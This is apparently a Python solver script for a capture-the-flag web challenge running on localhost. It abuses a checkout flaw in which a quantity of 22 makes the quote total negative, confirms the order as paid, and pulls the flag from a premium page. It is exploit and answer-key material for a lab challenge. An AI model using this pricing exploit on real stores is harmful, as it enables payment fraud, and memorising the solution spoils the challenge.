import requests

BASE = "http://localhost:8000"
s = requests.Session()

s.post(f"{BASE}/register", data={"username": "solver", "password": "solver123"})
s.post(f"{BASE}/login", data={"username": "solver", "password": "solver123"})

# article_id 10 is "Lina's Private Security Research" in the seed data;
# a real player would discover this from the article feed / preview page
# rather than hardcoding it.
quote = s.post(f"{BASE}/api/checkout/quote",
                json={"article_id": 10, "quantity": 22}).json()
assert quote["total_due_cents"] < 0, quote

confirm = s.post(f"{BASE}/api/checkout/confirm",
                  json={"quote_id": quote["quote_id"]}).json()
assert confirm["status"] == "paid", confirm

page = s.get(f"{BASE}/premium/lina-private-research").text
flag = page.split("GCDxGLORY{")[1].split("}")[0]
print(f"GCDxGLORY{{{flag}}}")